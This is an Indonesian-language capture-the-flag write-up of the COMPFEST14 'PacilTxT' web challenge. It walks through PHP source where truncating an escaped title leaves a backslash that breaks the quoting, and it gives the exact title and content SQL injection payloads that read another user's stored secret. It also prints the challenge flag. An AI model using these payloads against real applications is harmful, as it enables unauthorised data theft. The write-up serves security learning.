# PacilTxT

> Write-up author: jon-brandy (SOLVED)

## DESKRIPSI:
Admin wrote his secret on this website. Can you read it?
`http://103.185.38.238:16729/`

Reference https://portswigger.net/support/sql-injection-in-different-statement-types

[FILE](https://github.com/jon-brandy/COMPFEST14-BAY-WU/blob/f8cf827bbb9adae041931e58fe93acd859885363/Asset/Web%20Exploitation/PacilTxT/submit.php)

## LANGKAH-LANGKAH:
1. Pertama, unduh file `.php` yang diberikan, lalu lihat isinya.

> SUBMIT.PHP

```php

<?php
require_once('koneksi.php');
require_once('utils.php');

if (!isset($_POST['title']) || !isset($_POST['content'])) {
    die('Method not allowed');
} 

$txtCode = gen_random_string(6);
$saveTitle = $db_connect->real_escape_string($_POST['title']);
$txtTitle = substr($saveTitle,0,20);
$txtContent = $db_connect->real_escape_string($_POST['content']);

$query = "INSERT INTO paciltxt_post(code, title, content) VALUES ('".$txtCode."', '".$txtTitle."', '".$txtContent."')";
$sql = $db_connect->query($query);
if ($db_connect->error) {
    header('Location: /');
}

header('Location: /view.php?code='.$txtCode);

```

2. Setelah diperhatikan, value dari variabel `$query` dapat kita manfaatkan kerentanannya.

![image](https://user-images.githubusercontent.com/70703371/185785104-cfb109bd-0371-432a-a37e-0bba025ba460.png)

3. Pada variable `$txtCode` value berisikan 6 strings random.

![image](https://user-images.githubusercontent.com/70703371/185785149-c31772e7-7359-4e90-8e50-919883524344.png)

4. Lalu pada variable `$txtTitle` diketahui value berisikan input strings pada textarea title dengan total 20 karakter maksimal.

![image](https://user-images.githubusercontent.com/70703371/185785198-73cddadb-2e9a-48d5-af1e-348be74284ad.png)

5. Terakhir pada variable `$txtContent` diketahui value berisikan input strings pada textarea content yang pastinya telah diescape setelah diinput atau memiliki escape character di akhir strings.

![image](https://user-images.githubusercontent.com/70703371/185785260-96da96bd-ea75-403b-8290-e9e1ab64ccbb.png)

> PADA TITLE JUGA TERDAPAT ESCAPE STRING

![image](https://user-images.githubusercontent.com/70703371/185785280-f98fed9b-e16f-4aa5-bb5f-cf95c9e85020.png)

> PADA CONTENT

![image](https://user-images.githubusercontent.com/70703371/185785287-4df12559-4bd2-4695-9872-9d361d7329e7.png)

6. Vuln yang dapat dimanfaatkan yaitu dengan melakukan input karakter sebanyak 19 saja karena nantinya `\` yang merupakan karakter dari escape string akan masuk menjadi karakter ke **20**.
7. Sehingga tutup petik yang sesungguhnya akan ter-*escape*.

![image](https://user-images.githubusercontent.com/70703371/185785421-c0036fa2-1b60-4fc6-b3f6-948660e5e947.png)

8. Pada tahap ini kurang lebih query akan menjadi seperti ini:

> NOTES : input isi title dengan -> AAAAAAAAAAAAAAAAAAA\', 

```sql
INSERT TWO paciltxt_post(code, title, content) VALUES ('randStrings' 'AAAAAAAAAAAAAAAAAAA\',  ...
```

9. Lalu pada content, karena kita sudah memiliki kontrol pada value content, saatnya mengubah sintaksnya. Namun perlu diingat untuk menambahkan separator `,` dan menambahkan comment pada **petik tutup** yang tidak diperlukan.
10. Selanjutnya, untuk mengambil value dari paciltxt_post, harus menggunakan aliasing. Hal ini dikarenakan simbol paciltxt_post sudah digunakan sebagai target dari query *INSERT*.
11. Berikut adalah querynya:

> VALUE UNTUK CONTENT

```sql
, (SELECT content FROM paciltxt_post as vuln LIMIT 1))-- ')
```

12. Pada tahap ini query secara lengkap akan tampak seperti berikut:

```sql
INSERT TWO paciltxt_post(code, title, content) VALUES ('randStrings' 'AAAAAAAAAAAAAAAAAAA\', ', (SELECT content FROM paciltxt_post as vuln LIMIT 1))-- ')
```

13. Kesimpulannya pada title inputkan -> `AAAAAAAAAAAAAAAAAAA\` dan pada content inputkan -> `, (SELECT content FROM paciltxt_post as vuln LIMIT 1))-- ')`. Lalu tekan button *post*.

![image](https://user-images.githubusercontent.com/70703371/185786148-e4b3dfb6-8945-477c-9dd4-ddb26ec73ce9.png)

15. Flag pun didapat!

![image](https://user-images.githubusercontent.com/70703371/185786089-3e9a7f4f-1bf2-4e3b-8978-6a4c742d86ac.png)



## FLAG

```
COMPFEST14{k3teLiti4n_4daLAh_kUnTjh1_faabc736c3}
```

## REFERENCES:

```
https://www.w3schools.com/sql/sql_select.asp
https://portswigger.net/support/sql-injection-in-different-statement-types
https://www.databasestar.com/sql-comments/#:~:text=%20To%20add%20a%20comment%20in%20SQL%2C%20you,slash%20and%20asterisk%20%E2%80%9C%2F%203%20%E2%80%9D%20More%20
```
